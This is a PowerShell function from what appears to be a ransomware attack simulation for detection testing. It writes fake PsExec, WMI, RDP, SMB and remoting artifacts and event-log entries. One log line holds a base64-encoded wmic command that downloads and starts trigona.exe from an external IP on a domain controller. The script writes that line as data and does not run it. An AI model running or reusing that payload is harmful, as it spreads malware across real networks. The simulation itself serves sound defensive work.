# ============================================================================
# TRIGONA RANSOMWARE SIMULATION - PHASE 5: LATERAL MOVEMENT
# ============================================================================
# This script simulates lateral movement techniques used by Trigona attackers
# to spread throughout the network.
# ============================================================================

function Simulate-LateralMovement {
    param($SimPaths)
    
    Write-Host "[+] Simulating Lateral Movement Techniques..." -ForegroundColor Green
    
    # Create simulation of PsExec usage
    $psexecPath = "$($SimPaths.Tools)\PsExec.exe"
    $psexecBytes = New-Object byte[] 2048
    [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($psexecBytes)
    [System.IO.File]::WriteAllBytes($psexecPath, $psexecBytes)
    
    # Create logs showing PsExec execution
    $psexecLogContent = @"
PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

cmd.exe started on DC01 with process ID 4728.
Microsoft Windows [Version 10.0.19042.1415]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
desktop-trigona\administrator

C:\Windows\system32>net user administrator
User name                    Administrator
Full Name                    
Comment                      Built-in account for administering the computer/domain
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            12/24/2023 6:32:42 PM
Password expires             Never
Password changeable          12/24/2023 6:32:42 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   12/24/2023 6:48:13 PM

Logon hours allowed          All

Local Group Memberships      *Administrators       
Global Group memberships     *None                 
The command completed successfully.

C:\Windows\system32>exit

cmd.exe exited on DC01 with error code 0.
"@
    
    $psexecLogPath = "$($SimPaths.Logs)\psexec.log"
    Set-Content -Path $psexecLogPath -Value $psexecLogContent -Force
    
    # Create WMI lateral movement artifact
    $wmiCommandsContent = @"
wmic /node:DC01 process call create "cmd.exe /c powershell -e JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAYwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAIgBoAHQAdABwADoALwAvADIAMwAuADEANAA2AC4AMgA0ADIALgAxADkAOQAvAHQAcgBpAGcAbwBuAGEALgBlAHgAZQAiACwAIgBcAFwARABDADAAMQBcAGMAJABcAHcAaQBuAGQAbwB3AHMAXAB0AGUAbQBwAFwAdAByAGkAZwBvAG4AYQAuAGUAeABlACIAKQA7ACQAYQA9ACIAXABcAEQAQwAwADEAXABjACQAXAB3AGkAbgBkAG8AdwBzAFwAdABlAG0AcABcAHQAcgBpAGcAbwBuAGEALgBlAHgAZQAiADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACQAYQA7AA=="
"@
    
    $wmiLogPath = "$($SimPaths.Logs)\wmi_lateral.log"
    Set-Content -Path $wmiLogPath -Value $wmiCommandsContent -Force
    
    # Create RDP connection logs
    $rdpConnectionContent = @"
Date: 12/24/2023 6:52:13 PM
Source: 192.168.1.10
Destination: 192.168.1.25 (DC01)
User: administrator
Session ID: 3
Connection Type: RDP
Duration: 00:15:32
"@
    
    $rdpLogPath = "$($SimPaths.Logs)\rdp_connections.log"
    Set-Content -Path $rdpLogPath -Value $rdpConnectionContent -Force
    
    # Create SMB connection artifacts
    $smbConnectionContent = @"
SMB Connection Log:
12/24/2023 18:55:23 - \\DC01\C$ - Access Granted - User: DESKTOP-TRIGONA\Administrator
12/24/2023 18:56:12 - \\DC01\ADMIN$ - Access Granted - User: DESKTOP-TRIGONA\Administrator
12/24/2023 18:57:45 - \\FS01\Data$ - Access Granted - User: DESKTOP-TRIGONA\Administrator
12/24/2023 18:59:03 - \\FS01\Finance$ - Access Denied - User: DESKTOP-TRIGONA\Administrator
12/24/2023 19:01:22 - \\FS01\HR$ - Access Denied - User: DESKTOP-TRIGONA\Administrator
"@
    
    $smbLogPath = "$($SimPaths.Logs)\smb_connections.log"
    Set-Content -Path $smbLogPath -Value $smbConnectionContent -Force
    
    # Create PowerShell remoting artifacts
    $psRemotingContent = @"
PowerShell Remoting Session:
[12/24/2023 19:05:43] New-PSSession -ComputerName DC01 -Credential (Get-Credential)
[12/24/2023 19:06:12] Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Windows\system32> whoami
desktop-trigona\administrator
[DC01]: PS C:\Windows\system32> Get-Process
[DC01]: PS C:\Windows\system32> Get-Service | Where-Object {`$_.Status -eq 'Running'}
[DC01]: PS C:\Windows\system32> Get-ChildItem -Path C:\Users -Recurse -Force
[DC01]: PS C:\Windows\system32> exit
"@
    
    $psRemotingLogPath = "$($SimPaths.Logs)\ps_remoting.log"
    Set-Content -Path $psRemotingLogPath -Value $psRemotingContent -Force
    
    # Log lateral movement activities
    Write-EventLog -LogName "Application" -Source "TrigonaSim" -EventId 1345 -Message "SIMULATION: WMI lateral movement detected to DC01" -EntryType Warning
    Write-EventLog -LogName "Application" -Source "TrigonaSim" -EventId 1346 -Message "SIMULATION: RDP connection to domain controller detected" -EntryType Warning
    
    # Create network connection artifacts
    try {
        $null = Test-NetConnection -ComputerName "DC01" -CommonTCPPort SMB -InformationLevel Quiet -ErrorAction SilentlyContinue
        $null = Test-NetConnection -ComputerName "DC01" -CommonTCPPort RDP -InformationLevel Quiet -ErrorAction SilentlyContinue
        $null = Test-NetConnection -ComputerName "FS01" -CommonTCPPort SMB -InformationLevel Quiet -ErrorAction SilentlyContinue
    } catch {}
    
    Write-Host "  [✓] Lateral Movement artifacts created" -ForegroundColor Yellow
}